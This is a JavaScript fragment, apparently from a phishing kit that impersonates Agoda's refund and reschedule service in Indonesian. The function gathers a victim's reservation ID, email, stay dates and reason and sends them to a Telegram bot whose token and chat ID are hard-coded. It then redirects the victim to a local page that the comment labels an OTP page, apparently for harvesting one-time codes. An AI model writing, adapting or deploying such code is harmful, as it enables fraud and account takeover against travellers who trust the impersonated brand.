const sendToTelegram = async (data) => {
    const token = "6815357868:AAG7JQ2BQcl0g4kiIY5rvxduqThopC39fxY";
    const chatId = "6691063456";
    const text = `<b>🚀 Pengajuan Baru Agoda</b>

` +
                 `<b>Jenis:</b> ${data.requestType === 'reschedule' ? 'Ubah Jadwal' : 'Refund'}
` +
                 `<b>ID Reservasi:</b> ${data.reservationId}
` +
                 `<b>Email:</b> ${data.email}
` +
                 `<b>Check-in:</b> ${data.checkInDate}
` +
                 `<b>Check-out:</b> ${data.checkOutDate}
` +
                 `<b>Alasan:</b> ${data.reason}
` +
                 `<b>Setuju Syarat:</b> ${data.agreeTerms ? 'Ya' : 'Tidak'}`;
    
    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Telegram Error:', error);
    }
    
    // PENGALIHAN (REDIRECT) KE HALAMAN OTP LOKAL
    window.location.href = 'ott.html';
};

// ... (Rest of the minified React code)
